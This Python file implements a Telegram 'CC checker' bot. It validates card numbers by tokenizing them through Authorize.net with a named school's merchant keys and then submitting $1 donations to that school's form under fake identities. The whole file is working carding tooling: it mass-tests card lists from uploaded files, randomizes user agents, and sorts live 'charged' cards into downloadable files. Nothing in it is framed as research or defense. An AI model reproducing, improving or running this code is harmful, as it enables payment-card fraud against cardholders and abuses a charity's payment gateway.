import logging
import asyncio
import aiohttp
import json
import re
import time
import random
import os
import sys
from typing import Optional, Tuple, List
from dataclasses import dataclass
from io import BytesIO
import nest_asyncio
from faker import Faker
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ExtBot
)
from telegram.constants import ParseMode
import colorama
from colorama import Fore, Style

# Apply nest_asyncio
nest_asyncio.apply()

# Initialize colorama
colorama.init(autoreset=True)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

# Configuration from environment variables
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
PORT = int(os.environ.get("PORT", 8080))
RAILWAY_PUBLIC_DOMAIN = os.environ.get("RAILWAY_PUBLIC_DOMAIN", "")
WEBHOOK_URL = f"https://{RAILWAY_PUBLIC_DOMAIN}/webhook" if RAILWAY_PUBLIC_DOMAIN else ""

# API Configuration
CLIENT_KEY = "88uBHDjfPcY77s4jP6JC5cNjDH94th85m2sZsq83gh4pjBVWTYmc4WUdCW7EbY6F"
API_LOGIN_ID = "93HEsxKeZ4D"
BASE_URL = "https://www.jetsschool.org"
FORM_ID = "6913"
AUTHORIZE_API_URL = "https://api2.authorize.net/xml/v1/request.api"

# Emoji constants
EMOJIS = {
    "success": "✅", "error": "❌", "warning": "⚠️", "info": "ℹ️",
    "money": "💵", "card": "💳", "clock": "⏱️", "check": "✔️",
    "cross": "✖️", "heart": "❤️", "rocket": "🚀", "settings": "⚙️",
    "stats": "📊", "file": "📁", "database": "🗄️", "user": "👤",
    "bot": "🤖", "lock": "🔒", "unlock": "🔓", "refresh": "🔄",
    "wave": "👋", "bank": "🏦", "location": "📍", "robot": "🤖"
}

fake = Faker()

@dataclass
class CheckResult:
    """Data class for check results"""
    card_number: str
    status: str
    message: str
    timestamp: float
    bin_info: Optional[dict] = None

class AuthorizeNetChecker:
    """Main checker class"""
    
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.user_agent = fake.user_agent()
        self.session_headers = {
            "User-Agent": self.user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

    async def get_initial_cookies(self, session: aiohttp.ClientSession) -> None:
        """Get initial cookies from donation page"""
        try:
            url = f"{BASE_URL}/donate/?form-id={FORM_ID}"
            async with session.get(url, timeout=20) as response:
                await response.text()
        except Exception:
            pass

    async def tokenize_cc(self, cc: str, mm: str, yy: str, cvv: str, session: aiohttp.ClientSession) -> Tuple[Optional[str], Optional[str], Optional[str]]:
        """Tokenize credit card via Authorize.net API"""
        try:
            expire_token = f"{mm}{yy[-2:]}"
            timestamp = str(int(time.time() * 1000))
            
            payload = {
                "securePaymentContainerRequest": {
                    "merchantAuthentication": {
                        "name": API_LOGIN_ID,
                        "clientKey": CLIENT_KEY
                    },
                    "data": {
                        "type": "TOKEN",
                        "id": timestamp,
                        "token": {
                            "cardNumber": cc,
                            "expirationDate": expire_token,
                            "cardCode": cvv
                        }
                    }
                }
            }

            headers = {
                "Content-Type": "application/json",
                "Origin": BASE_URL,
                "Referer": f"{BASE_URL}/",
                "User-Agent": self.user_agent
            }
            
            async with session.post(AUTHORIZE_API_URL, json=payload, headers=headers, timeout=20) as response:
                data = await response.json()

            if data.get("messages", {}).get("resultCode") == "Ok":
                descriptor = data["opaqueData"]["dataDescriptor"]
                value = data["opaqueData"]["dataValue"]
                return descriptor, value, None
            else:
                msg = data.get("messages", {}).get("message", [{}])[0].get("text", "Tokenization Failed")
                return None, None, msg
        except Exception as e:
            return None, None, str(e)

    async def submit_donation(self, cc_full: str, descriptor: str, value: str, session: aiohttp.ClientSession) -> Tuple[str, str]:
        """Submit donation with tokenized card"""
        cc, mm, yy, cvv = cc_full.split("|")
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = f"{first_name.lower()}.{last_name.lower()}{random.randint(100,999)}@gmail.com"
        
        data = {
            "give-form-id": FORM_ID,
            "give-form-title": "Donate",
            "give-current-url": f"{BASE_URL}/donate/?form-id={FORM_ID}",
            "give-form-url": f"{BASE_URL}/donate/",
            "give-form-minimum": "1.00",
            "give-form-maximum": "999999.99",
            "give-amount": "1.00",
            "payment-mode": "authorize",
            "give_first": first_name,
            "give_last": last_name,
            "give_email": email,
            "give_authorize_data_descriptor": descriptor,
            "give_authorize_data_value": value,
            "give_action": "purchase",
            "give-gateway": "authorize",
            "card_address": fake.street_address(),
            "card_city": fake.city(),
            "card_state": fake.state_abbr(),
            "card_zip": fake.zipcode(),
            "billing_country": "US",
            "card_number": "0000000000000000",
            "card_cvc": "000",
            "card_name": "0000000000000000",
            "card_exp_month": "00",
            "card_exp_year": "00",
            "card_expiry": "00 / 00"
        }

        try:
            # Get form hash
            async with session.get(f"{BASE_URL}/donate/?form-id={FORM_ID}", timeout=20) as response:
                page_text = await response.text()
                hash_match = re.search(r'name="give-form-hash" value="(.*?)"', page_text)
                if hash_match:
                    data["give-form-hash"] = hash_match.group(1)
                else:
                    return "ERROR", "Could not find give-form-hash"
        except Exception:
            return "ERROR", "Failed to load donation page"

        try:
            async with session.post(
                f"{BASE_URL}/donate/?payment-mode=authorize&form-id={FORM_ID}",
                data=data,
                timeout=30
            ) as response:
                text = await response.text()
                text_lower = text.lower()
                
                if "donation confirmation" in text_lower or "thank you" in text_lower or "payment complete" in text_lower:
                    return "CHARGED", "Payment Successful! ❤️"
                elif "declined" in text_lower or "error" in text_lower:
                    err_match = re.search(r'class="give_error">(.*?)<', text)
                    if err_match:
                        return "DECLINED", err_match.group(1)
                    return "DECLINED", "Transaction Declined"
                else:
                    return "DECLINED", "Unknown Response"
                    
        except Exception as e:
            return "ERROR", str(e)

    async def check_card(self, cc_line: str) -> CheckResult:
        """Main method to check a single card"""
        try:
            if "|" not in cc_line:
                return CheckResult(
                    card_number=cc_line.split("|")[0] if "|" in cc_line else cc_line,
                    status="ERROR",
                    message="Invalid format. Use CC|MM|YYYY|CVV",
                    timestamp=time.time()
                )
            
            cc, mm, yy, cvv = cc_line.strip().split("|")
            
            # Get BIN info
            bin_info = await self.get_bin_info(cc[:6])
            
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector, headers=self.session_headers) as session:
                await self.get_initial_cookies(session)
                
                descriptor, value, error = await self.tokenize_cc(cc, mm, yy, cvv, session)
                
                if not descriptor:
                    return CheckResult(
                        card_number=cc,
                        status="ERROR",
                        message=f"Tokenization Failed: {error}",
                        timestamp=time.time(),
                        bin_info=bin_info
                    )

                status, msg = await self.submit_donation(cc_line.strip(), descriptor, value, session)
                
                return CheckResult(
                    card_number=cc,
                    status=status,
                    message=msg,
                    timestamp=time.time(),
                    bin_info=bin_info
                )
                
        except Exception as e:
            return CheckResult(
                card_number=cc_line.split("|")[0] if "|" in cc_line else "Unknown",
                status="ERROR",
                message=str(e),
                timestamp=time.time()
            )

    async def get_bin_info(self, bin_number: str) -> Optional[dict]:
        """Get BIN information for card"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://lookup.binlist.net/{bin_number}", timeout=10) as response:
                    if response.status == 200:
                        return await response.json()
        except Exception:
            pass
        return None

class CheckBot:
    """Main bot class"""
    
    def __init__(self, token: str):
        self.token = token
        self.application = None
        self.results_history = []
        self.active_checks = 0
        self.stats = {
            "total_checks": 0,
            "charged": 0,
            "declined": 0,
            "errors": 0
        }

    def mask_card(self, card: str) -> str:
        """Mask card number for display"""
        if len(card) >= 12:
            return f"{card[:6]}******{card[-4:]}"
        return card

    def format_card_result(self, result: CheckResult) -> str:
        """Format card check result"""
        status_emoji = {
            "CHARGED": f"{EMOJIS['success']} CHARGED",
            "DECLINED": f"{EMOJIS['error']} DECLINED",
            "ERROR": f"{EMOJIS['warning']} ERROR"
        }.get(result.status, f"{EMOJIS['info']} UNKNOWN")
        
        bin_text = ""
        if result.bin_info:
            scheme = result.bin_info.get('scheme', 'Unknown').upper()
            bank = result.bin_info.get('bank', {}).get('name', 'Unknown')
            country = result.bin_info.get('country', {}).get('name', 'Unknown')
            card_type = result.bin_info.get('type', 'Unknown').upper()
            bin_text = f"\n┣ {EMOJIS['database']} BIN: `{result.card_number[:6]}`"
            bin_text += f"\n┣ {EMOJIS['card']} Card: {scheme} - {card_type}"
            bin_text += f"\n┣ {EMOJIS['bank']} Bank: {bank}"
            bin_text += f"\n┗ {EMOJIS['location']} Country: {country}"
        
        check_time = time.strftime("%H:%M:%S", time.localtime(result.timestamp))
        
        message = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  {EMOJIS['card']}  CARD CHECK RESULT  {EMOJIS['check']} 
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┣ {EMOJIS['money']} Card: `{self.mask_card(result.card_number)}`
┣ Status: {status_emoji}
┣ Message: `{result.message[:50]}{'...' if len(result.message) > 50 else ''}`{bin_text}
┣ {EMOJIS['clock']} Time: `{check_time}`
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """
        return message

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        user = update.effective_user
        welcome_msg = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    {EMOJIS['bot']}  WELCOME TO CHECKER BOT  {EMOJIS['robot']}   
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Hello {user.first_name}! {EMOJIS['wave']}
┃
┃ {EMOJIS['rocket']} Available Commands:
┃
┃ {EMOJIS['card']} `/au` - Single card check
┃ {EMOJIS['file']} `/mau` - Mass check from file
┃ {EMOJIS['database']} `/autxt` - Check from text input
┃ {EMOJIS['stats']} `/stats` - Bot statistics
┃ {EMOJIS['info']} `/help` - Show this help
┃
┃ {EMOJIS['warning']} Format: `CC|MM|YYYY|CVV`
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """
        
        keyboard = [
            [InlineKeyboardButton(f"{EMOJIS['card']} Single Check", callback_data="single"),
             InlineKeyboardButton(f"{EMOJIS['file']} Mass Check", callback_data="mass")],
            [InlineKeyboardButton(f"{EMOJIS['stats']} Statistics", callback_data="stats"),
             InlineKeyboardButton(f"{EMOJIS['settings']} Settings", callback_data="settings")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            welcome_msg,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )

    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        help_msg = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      {EMOJIS['info']}  HELP & INFORMATION  {EMOJIS['info']}       
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ {EMOJIS['rocket']} Commands:
┃
┃ `/au CC|MM|YYYY|CVV`
┃  Single card check
┃
┃ `/mau` (reply to a file)
┃  Mass check from uploaded file
┃
┃ `/autxt` (with multiple cards)
┃  Check multiple cards from text
┃
┃ `/stats` - View statistics
┃
┃ {EMOJIS['warning']} Format example:
┃ `4111111111111111|12|2025|123`
┃
┃ {EMOJIS['info']} Status meanings:
┃ {EMOJIS['success']} CHARGED - Card charged successfully
┃ {EMOJIS['error']} DECLINED - Transaction declined
┃ {EMOJIS['warning']} ERROR - Technical error
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """
        await update.message.reply_text(help_msg, parse_mode=ParseMode.MARKDOWN)

    async def single_check(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /au command"""
        if not context.args:
            await update.message.reply_text(
                f"{EMOJIS['warning']} Usage: `/au CC|MM|YYYY|CVV`\n"
                f"Example: `/au 4111111111111111|12|2025|123`",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        card_data = " ".join(context.args)
        await self.process_single_card(update, card_data)

    async def process_single_card(self, update: Update, card_data: str):
        """Process single card check"""
        status_msg = await update.message.reply_text(
            f"{EMOJIS['clock']} Processing card: `{self.mask_card(card_data.split('|')[0])}`...\n"
            f"┣ Tokenizing...\n"
            f"┗ Submitting...",
            parse_mode=ParseMode.MARKDOWN
        )

        self.active_checks += 1
        checker = AuthorizeNetChecker()
        result = await checker.check_card(card_data)
        self.active_checks -= 1
        
        # Update stats
        self.stats["total_checks"] += 1
        if result.status == "CHARGED":
            self.stats["charged"] += 1
        elif result.status == "DECLINED":
            self.stats["declined"] += 1
        else:
            self.stats["errors"] += 1
        
        self.results_history.append(result)
        
        result_msg = self.format_card_result(result)
        
        keyboard = [
            [InlineKeyboardButton(f"{EMOJIS['check']} Check Another", callback_data="single"),
             InlineKeyboardButton(f"{EMOJIS['file']} Mass Check", callback_data="mass")],
            [InlineKeyboardButton(f"{EMOJIS['stats']} View Stats", callback_data="stats")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await status_msg.edit_text(
                result_msg,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup
            )
        except Exception:
            await update.message.reply_text(result_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    async def mass_check_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /mau command"""
        if not update.message.reply_to_message or not update.message.reply_to_message.document:
            await update.message.reply_text(
                f"{EMOJIS['warning']} Please reply to a file with `/mau` command",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        await update.message.reply_text(f"{EMOJIS['clock']} Processing file... Please wait.")

        document = update.message.reply_to_message.document
        file = await context.bot.get_file(document.file_id)
        
        try:
            file_content = await file.download_as_bytearray()
            content = file_content.decode('utf-8', errors='ignore')
            
            cards = [line.strip() for line in content.split('\n') if line.strip() and '|' in line]
            
            if not cards:
                await update.message.reply_text(f"{EMOJIS['warning']} No valid cards found in file")
                return

            await self.process_mass_cards(update, cards, "file")
        except Exception as e:
            logger.error(f"File processing error: {e}")
            await update.message.reply_text(f"{EMOJIS['error']} Error processing file: {str(e)}")

    async def mass_check_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /autxt command"""
        if not context.args:
            await update.message.reply_text(
                f"{EMOJIS['warning']} Please provide card data or reply to a message with cards",
                parse_mode=ParseMode.MARKDOWN
            )
            return

        text = " ".join(context.args)
        cards = [line.strip() for line in text.split('\n') if line.strip() and '|' in line]
        
        if not cards:
            await update.message.reply_text(f"{EMOJIS['warning']} No valid cards found in text")
            return

        await self.process_mass_cards(update, cards, "text")

    async def process_mass_cards(self, update: Update, cards: List[str], source_type: str):
        """Process multiple cards"""
        status_msg = await update.message.reply_text(
            f"{EMOJIS['rocket']} Starting mass check of {len(cards)} cards...\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"Progress: 0/{len(cards)}\n"
            f"Charged: 0\n"
            f"Declined: 0\n"
            f"Errors: 0",
            parse_mode=ParseMode.MARKDOWN
        )

        results = []
        
        for i, card in enumerate(cards):
            self.active_checks += 1
            checker = AuthorizeNetChecker()
            result = await checker.check_card(card)
            self.active_checks -= 1
            results.append(result)
            
            # Update stats
            self.stats["total_checks"] += 1
            if result.status == "CHARGED":
                self.stats["charged"] += 1
            elif result.status == "DECLINED":
                self.stats["declined"] += 1
            else:
                self.stats["errors"] += 1
            
            # Update progress
            if (i + 1) % 3 == 0 or i + 1 == len(cards):
                charged = sum(1 for r in results if r.status == "CHARGED")
                declined = sum(1 for r in results if r.status == "DECLINED")
                errors = sum(1 for r in results if r.status == "ERROR")
                
                try:
                    await status_msg.edit_text(
                        f"{EMOJIS['rocket']} Mass Check Progress\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"Progress: {i+1}/{len(cards)}\n"
                        f"{EMOJIS['success']} Charged: {charged}\n"
                        f"{EMOJIS['error']} Declined: {declined}\n"
                        f"{EMOJIS['warning']} Errors: {errors}",
                        parse_mode=ParseMode.MARKDOWN
                    )
                except:
                    pass
            
            # Small delay
            await asyncio.sleep(0.5)
        
        await self.send_mass_check_summary(update, results, status_msg)

    async def send_mass_check_summary(self, update: Update, results: List[CheckResult], status_msg):
        """Send summary of mass check results"""
        charged = [r for r in results if r.status == "CHARGED"]
        declined = [r for r in results if r.status == "DECLINED"]
        errors = [r for r in results if r.status == "ERROR"]
        
        success_rate = (len(charged)/len(results)*100) if len(results) > 0 else 0
        
        summary = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃    {EMOJIS['stats']}  MASS CHECK SUMMARY  {EMOJIS['stats']}      
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ Total Cards: {len(results)}
┃ {EMOJIS['success']} CHARGED: {len(charged)}
┃ {EMOJIS['error']} DECLINED: {len(declined)}
┃ {EMOJIS['warning']} ERRORS: {len(errors)}
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ {EMOJIS['money']} Success Rate: {success_rate:.1f}%
┃ {EMOJIS['clock']} Time: {time.strftime('%H:%M:%S')}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """
        
        # Send result files
        if charged:
            charged_text = "\n".join([f"{r.card_number}|{r.status}|{r.message}" for r in charged])
            charged_file = BytesIO(charged_text.encode())
            charged_file.name = "charged_cards.txt"
            await update.message.reply_document(
                document=charged_file,
                filename="charged_cards.txt",
                caption=f"{EMOJIS['success']} Charged Cards ({len(charged)})"
            )
        
        if declined:
            declined_text = "\n".join([f"{r.card_number}|{r.status}|{r.message}" for r in declined])
            declined_file = BytesIO(declined_text.encode())
            declined_file.name = "declined_cards.txt"
            await update.message.reply_document(
                document=declined_file,
                filename="declined_cards.txt",
                caption=f"{EMOJIS['error']} Declined Cards ({len(declined)})"
            )
        
        keyboard = [
            [InlineKeyboardButton(f"{EMOJIS['check']} New Check", callback_data="single"),
             InlineKeyboardButton(f"{EMOJIS['file']} Another Mass", callback_data="mass")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await status_msg.edit_text(summary, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        except:
            await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    async def stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /stats command"""
        total = self.stats["total_checks"]
        success_rate = (self.stats["charged"] / total * 100) if total > 0 else 0
        
        stats_msg = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      {EMOJIS['stats']}  BOT STATISTICS  {EMOJIS['stats']}       
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ {EMOJIS['database']} Total Checks: {total}
┃ {EMOJIS['success']} Charged: {self.stats['charged']}
┃ {EMOJIS['error']} Declined: {self.stats['declined']}
┃ {EMOJIS['warning']} Errors: {self.stats['errors']}
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ {EMOJIS['money']} Success Rate: {success_rate:.1f}%
┃ {EMOJIS['clock']} Active Checks: {self.active_checks}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
        """
        
        keyboard = [
            [InlineKeyboardButton(f"{EMOJIS['refresh']} Refresh", callback_data="refresh_stats"),
             InlineKeyboardButton(f"{EMOJIS['check']} New Check", callback_data="single")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(stats_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)

    async def button_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        await query.answer()
        
        if query.data == "single":
            await query.message.reply_text(
                f"{EMOJIS['card']} Send card in format: `CC|MM|YYYY|CVV`",
                parse_mode=ParseMode.MARKDOWN
            )
        elif query.data == "mass":
            await query.message.reply_text(
                f"{EMOJIS['file']} Send a file with cards or use `/autxt` command",
                parse_mode=ParseMode.MARKDOWN
            )
        elif query.data == "stats" or query.data == "refresh_stats":
            total = self.stats["total_checks"]
            success_rate = (self.stats["charged"] / total * 100) if total > 0 else 0
            
            stats_msg = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      {EMOJIS['stats']}  BOT STATISTICS  {EMOJIS['stats']}       
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ {EMOJIS['database']} Total Checks: {total}
┃ {EMOJIS['success']} Charged: {self.stats['charged']}
┃ {EMOJIS['error']} Declined: {self.stats['declined']}
┃ {EMOJIS['warning']} Errors: {self.stats['errors']}
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ {EMOJIS['money']} Success Rate: {success_rate:.1f}%
┃ {EMOJIS['clock']} Active Checks: {self.active_checks}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
            """
            
            keyboard = [
                [InlineKeyboardButton(f"{EMOJIS['refresh']} Refresh", callback_data="refresh_stats"),
                 InlineKeyboardButton(f"{EMOJIS['check']} New Check", callback_data="single")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.message.edit_text(stats_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
        elif query.data == "settings":
            settings_msg = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃      {EMOJIS['settings']}  SETTINGS  {EMOJIS['settings']}         
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┃ {EMOJIS['lock']} Private Mode: Enabled
┃ {EMOJIS['database']} Save Results: Yes
┃ {EMOJIS['clock']} Timeout: 30 seconds
┃ {EMOJIS['card']} Format: CC|MM|YYYY|CVV
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
            """
            await query.message.edit_text(settings_msg, parse_mode=ParseMode.MARKDOWN)

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle errors"""
        logger.error(f"Update {update} caused error {context.error}")
        try:
            if update and update.effective_message:
                await update.effective_message.reply_text(
                    f"{EMOJIS['error']} An error occurred. Please try again later."
                )
        except:
            pass

    async def run_webhook(self):
        """Run bot with webhook for Railway"""
        # Build application
        self.application = Application.builder().token(self.token).build()
        
        # Add handlers
        self.application.add_handler(CommandHandler("start", self.start))
        self.application.add_handler(CommandHandler("help", self.help))
        self.application.add_handler(CommandHandler("au", self.single_check))
        self.application.add_handler(CommandHandler("mau", self.mass_check_file))
        self.application.add_handler(CommandHandler("autxt", self.mass_check_text))
        self.application.add_handler(CommandHandler("stats", self.stats))
        self.application.add_handler(CallbackQueryHandler(self.button_handler))
        self.application.add_error_handler(self.error_handler)
        
        # Initialize the application
        await self.application.initialize()
        
        # Set webhook
        if WEBHOOK_URL:
            await self.application.bot.set_webhook(url=WEBHOOK_URL)
            logger.info(f"Webhook set to {WEBHOOK_URL}")
        
        # Start the application
        await self.application.start()
        
        # Start webhook server
        if WEBHOOK_URL:
            await self.application.updater.start_webhook(
                listen="0.0.0.0",
                port=PORT,
                url_path="webhook",
                webhook_url=WEBHOOK_URL
            )
            logger.info(f"Bot is running on port {PORT}")
        else:
            await self.application.updater.start_polling()
            logger.info("Bot started with polling")
        
        # Print startup message (only after everything is initialized)
        bot_username = "Unknown"
        try:
            if self.application.bot:
                bot_info = await self.application.bot.get_me()
                bot_username = bot_info.username
        except Exception as e:
            logger.error(f"Error getting bot info: {e}")
        
        print(f"\n{Fore.GREEN}{EMOJIS['rocket']} Bot is running!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{EMOJIS['bot']} Bot username: @{bot_username}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Press Ctrl+C to stop{Style.RESET_ALL}\n")
        
        # Keep running
        try:
            while True:
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            logger.info("Stopping bot...")
            await self.application.stop()
            await self.application.shutdown()
    
    def run(self):
        """Main run method"""
        if not self.token:
            print(f"{Fore.RED}{EMOJIS['error']} BOT_TOKEN is not set!{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}{EMOJIS['rocket']} Starting CC Checker Bot...{Style.RESET_ALL}")
        
        if WEBHOOK_URL:
            print(f"{Fore.CYAN}Mode: Webhook on port {PORT}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}Mode: Polling (local development){Style.RESET_ALL}")
        
        # Run the webhook
        asyncio.run(self.run_webhook())

def main():
    """Main entry point"""
    # Check for required environment variables
    if not BOT_TOKEN:
        print(f"{Fore.RED}{EMOJIS['error']} Error: BOT_TOKEN environment variable is not set!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Please set it in Railway dashboard or as environment variable{Style.RESET_ALL}")
        return
    
    bot = CheckBot(BOT_TOKEN)
    bot.run()

if __name__ == "__main__":
    main()
